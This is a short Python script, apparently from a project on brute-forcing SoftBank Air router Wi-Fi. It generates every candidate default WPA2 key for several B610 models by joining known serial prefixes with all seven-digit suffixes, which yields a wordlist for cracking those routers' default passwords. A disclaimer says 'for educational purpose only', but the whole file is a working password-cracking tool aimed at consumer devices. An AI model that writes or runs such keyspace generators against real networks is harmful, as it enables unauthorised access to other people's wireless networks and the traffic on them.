# Author:   Naqwada (RuptureFarm 1029) <naqwada@pm.me>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://gitlab.com/Naqwada/softbank-air-brutforce-wpa
# Website:  https://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

# Not compatible with B610h-71a since they change there algorithm to generate the default WPA2 key (14 random chars...)

SNs = [
  '557781', #b610s-76a
  '553011', #b610s-77a serie 1
  '553012', #b610s-77a serie 2
  '553511', #b610s-79a
  '554011'  #b610h-70a
]

for SN in SNs:
    for i in range(10000000):
      print(int(SN+str(f'{i:07}')))
